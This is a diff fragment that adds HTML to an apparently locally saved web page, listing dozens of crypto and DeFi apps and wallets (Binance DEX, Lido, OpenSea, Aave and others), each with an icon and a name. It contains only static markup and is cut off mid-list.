+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Binance DEX" class="img_icons" src="local_resources/img/fcece56cb90b59e61757357de2fdc275.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Binance DEX
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Lido" class="img_icons" src="local_resources/img/cd368989234bb7a088f8e4c0ee3f2837.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Lido
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Balance" class="img_icons" src="local_resources/img/5b835ba0f4d8464836beba83f30a4202.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Balanced
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Terrastation" class="img_icons" src="local_resources/img/362fe482154422e6afd08c1ba16ae11d.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          TERRAstation
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="OpenSea" class="img_icons" src="local_resources/img/03dc13c933b8ae0b8708eb33f40e595c.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          OpenSea
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Compound" class="img_icons" src="local_resources/img/5031eaddd455956a4aba872d00e29c4c.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Compound
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Zapper" class="img_icons" src="local_resources/img/aabe801aeeae350a01d6dcd87accaab8.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Zapper
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Aave" class="img_icons" src="local_resources/img/bbc3422704b987846b7ad39bee02c311.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Aave
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Zerion" class="img_icons" src="local_resources/img/2cd0fe0d1218ac3942842f14dd64fe07.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Zerion
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="LocalCryptos" class="img_icons" src="local_resources/img/8504ac45daaae800c5e59d5a3f9cbdbd.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          LocalCryptos
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="DeBank" class="img_icons" src="local_resources/img/7e6470b9004f4b8e08a8867ecf8491a9.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          DeBank
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Unstoppable Domains" class="img_icons" src="local_resources/img/703b1b4e358a5a734079103bbbee5338.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Unstoppable Domains
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Rarible" class="img_icons" src="local_resources/img/03ad539255228f8b76234dfef2847752.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Rarible
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="1inch Exchange" class="img_icons" src="local_resources/img/e5a49b11101076aee8467162dc074e38.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          1inch Exchange
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="yearn" class="img_icons" src="local_resources/img/aca218c3a3a07811641e7a676e9b80d5.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          yearn
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Nash" class="img_icons" src="local_resources/img/a4ecb87f340cb538614da1f7245d6215.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Nash
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Curve" class="img_icons" src="local_resources/img/04137ce067f9e19bff067b13ecbaf011.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Curve
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Adex Network" class="img_icons" src="local_resources/img/60f417da0023fbb81a64e0f80544f695.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Adex Network
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="dYdX" class="img_icons" src="local_resources/img/50355c6e01a2b39f1a9bb3c6866d3c50.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          dYdX
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="MyCrypto" class="img_icons" src="local_resources/img/55b6753a1306383ef95d6bdf3f106259.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          MyCrypto
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Oasis App" class="img_icons" src="local_resources/img/6fa987d82f1eec65bab059b5db83c6b3.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Oasis App
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="TokenSets" class="img_icons" src="local_resources/img/2e195ff749232de2cd00b82592051c73.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          TokenSets
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="MANTRA DAO" class="img_icons" src="local_resources/img/09d52cc8b5c2c242c61e5c4fddc914b6.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          MANTRA DAO
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Matcha" class="img_icons" src="local_resources/img/1669fe35473d9d309117fc0e3ca2e284.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Matcha
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="KyberSwap" class="img_icons" src="local_resources/img/97dd53bf63ec443dcad5115a84965d4f.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          KyberSwap
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="DeFi Portfolio Tracker" class="img_icons" src="local_resources/img/3f85d1ae7b6fdfdd45be6700a862fe37.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          DeFi Portfolio Tracker
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Loopring" class="img_icons" src="local_resources/img/2656af89d7b717e6296a0dd7db79f002.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Loopring
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="InstaDapp" class="img_icons" src="local_resources/img/5ad3ea926123fd0a42e2bd86cfc95e91.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          InstaDapp
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Matic Network" class="img_icons" src="local_resources/img/c5293f0c509ee8a826a580c1b8cbd712.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Matic Network
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="3Box" class="img_icons" src="local_resources/img/df6a66f02e28e6091e8f64d5b0391c6f.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          3Box
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="DDEX" class="img_icons" src="local_resources/img/eecc9f3d47dff18a666753a1cb75b788.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          DDEX
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Totle" class="img_icons" src="local_resources/img/eee51bc1d6275b5dcb6673e664f8d494.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Totle
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Bamboo Relay" class="img_icons" src="local_resources/img/3b6fb04e946520fb8f12c062e1ebadb1.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Bamboo Relay
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Synthetix" class="img_icons" src="local_resources/img/19e48310a2dc8199afdd7350bf535a11.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Synthetix
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="dex.blue" class="img_icons" src="local_resources/img/d923ef633f7bce8a8d681400fcafb691.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          dex.blue
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="PoolTogether" class="img_icons" src="local_resources/img/56ce04eb55b0c002d83731e42c318c1e.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          PoolTogether
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Sablier" class="img_icons" src="local_resources/img/31ab900cc7c8b61169d7ca87d7c80a78.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Sablier
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="DEX.AG" class="img_icons" src="local_resources/img/23ea2310cf2eebe21914d99a2dd67dbf.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          DEX.AG
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Gelato" class="img_icons" src="local_resources/img/e330c11c009340ed9c61e5035ec934e9.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Gelato
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="ENS Domains" class="img_icons" src="local_resources/img/a3c1493aae73f888a9c512a2b251028a.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          ENS Domains
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Gnosis Safe Multisig" class="img_icons" src="local_resources/img/74d54ce7bf5b4fc1f98a575955e84fd5.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Gnosis Safe Multisig
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Idle Finance" class="img_icons" src="local_resources/img/afe580c02ca3327313ece1cc80a61448.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Idle Finance
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="iearn.finance" class="img_icons" src="local_resources/img/d54cbebd955305b26d742ae778fffc47.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          iearn.finance
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="RCN Finance" class="img_icons" src="local_resources/img/8d67a71dfa63abb0cf6bdc754bb73002.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          RCN Finance
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Hegic" class="img_icons" src="local_resources/img/a98a3fcd71353014b8598c620705646c.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Hegic
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Kickback" class="img_icons" src="local_resources/img/edf4219fd38f2d4cec159c838954d78d.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Kickback
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="88mph" class="img_icons" src="local_resources/img/ba97e5e9a795b9063cf05c246be32e8d.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          88mph
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Mooni" class="img_icons" src="local_resources/img/4965fc2eb1a12981aee56ed89b9f76e4.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Mooni
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Clovers" class="img_icons" src="local_resources/img/bd9611313200ad9976795426e2694302.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Clovers
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Mintbase" class="img_icons" src="local_resources/img/d03bb4a3decc1af49c7775e00bd483e2.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Mintbase
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="DAOstack" class="img_icons" src="local_resources/img/2a73bbf10d06e94b3d28726db885506e.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          DAOstack
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="KnownOrigin" class="img_icons" src="local_resources/img/a90637c79dede012575473aa5df08294.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          KnownOrigin
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="MyEtherWallet" class="img_icons" src="local_resources/img/a1cd32fd56de86a54546120e40841a19.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          MyEtherWallet
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Affogato" class="img_icons" src="local_resources/img/0ac0051038ffe634066093bb17818848.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Affogato
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="StablePay" class="img_icons" src="local_resources/img/e480791153bd5f58b7598f244c46696c.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          StablePay
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="DeFi Saver" class="img_icons" src="local_resources/img/309be2c9b00c25e9a7c094fe9f690b77.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          DeFi Saver
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Loom Network" class="img_icons" src="local_resources/img/03f75657defb1eb4b0c6ecf0df56b7b1.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Loom Network
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="ThorChain" class="img_icons" src="local_resources/img/3c65d6c4db938f3db016c9f8dc4d31c6.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          ThorChain
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="BulkSender" class="img_icons" src="local_resources/img/4eac601835326a1abc4ed88f76999196.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          BulkSender
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Heroes of Ether" class="img_icons" src="local_resources/img/def7c42686c918d0dff727cf3f4aa8fe.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Heroes of Ether
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Betoken" class="img_icons" src="local_resources/img/f166351bc890ddb0053d70c2d71ac045.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Betoken
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Linkdrop" class="img_icons" src="local_resources/img/9efc72ca65ee757a5e39cc28d5eeeb00.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Linkdrop
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="HelioWallet" class="img_icons" src="local_resources/img/1ecb06e30f2918738e9c6527d5cc1eab.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          HelioWallet
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Escaroo" class="img_icons" src="local_resources/img/6aeba3a9c0cce79faa813f8a073698c1.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Escaroo
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="TokenMarket" class="img_icons" src="local_resources/img/a7dfe17426551c512b4a6dc4a6a614fe.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          TokenMarket
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Mesa" class="img_icons" src="local_resources/img/93445ba8ffe03d07f5822b8a806927b0.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Mesa
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="MCDEX" class="img_icons" src="local_resources/img/05d2318bcea5cc0476b78984f854c057.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          MCDEX
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Furucombo" class="img_icons" src="local_resources/img/bb278f73e86c3d57e1fac854592957b1.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Furucombo
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Melon" class="img_icons" src="local_resources/img/c0ba2b3cdf82f604fc76ce2544775e75.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Melon
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Chainsfr" class="img_icons" src="local_resources/img/c2a5ab18937e1fa54f3f195cb9be78da.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Chainsfr
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="AKA3 Email Alias" class="img_icons" src="local_resources/img/607523b381149a3b4f125af6f95067a0.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          AKA3 Email Alias
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="2Key" class="img_icons" src="local_resources/img/1dc319d3738de384c9bec88c230463f5.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          2Key
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Pitch" class="img_icons" src="local_resources/img/409c0c262c44a326275eef711a87c0eb.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Pitch
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="SushiSwap" class="img_icons" src="local_resources/img/9a3e91438df527b97a322aa4c103a806.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          SushiSwap
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Unagii" class="img_icons" src="local_resources/img/56aca4bac677572f4ab594262b573a4a.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Unagii
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
+<img alt="Cream Finance" class="img_icons" src="local_resources/img/d3cddf54365d86c8e93dcda305467395.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Cream Finance
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="zkSync" class="img_icons" src="local_resources/img/9e7bbefa6669e76e67a5a001a2dffd60.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          zkSync
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Shell Exchange" class="img_icons" src="local_resources/img/9df847791608222dda87af2b47a67357.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Shell Exchange
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Index Coop" class="img_icons" src="local_resources/img/2ccd99217a6020a1a60ac3faf50e4501.jpg"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Index Coop
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="SwapX" class="img_icons" src="local_resources/img/01a14c00accca4f8cb14ca4b3b8a06fd.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          SwapX
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Starname" class="img_icons" src="local_resources/img/d3d804a8a809eeec213916d02b519437.png"/>
+</div>
+<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
+                          Starname
+                        </div>
+</div>
+<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
+<div class="pageStyles__SAppIcon-sc-1navawn-6 kSIOSl">
+<img alt="Space" class="img_icons" src="local_resources/img/34c5c7c94750e84299e54951f184830b.png"/>
+</div>
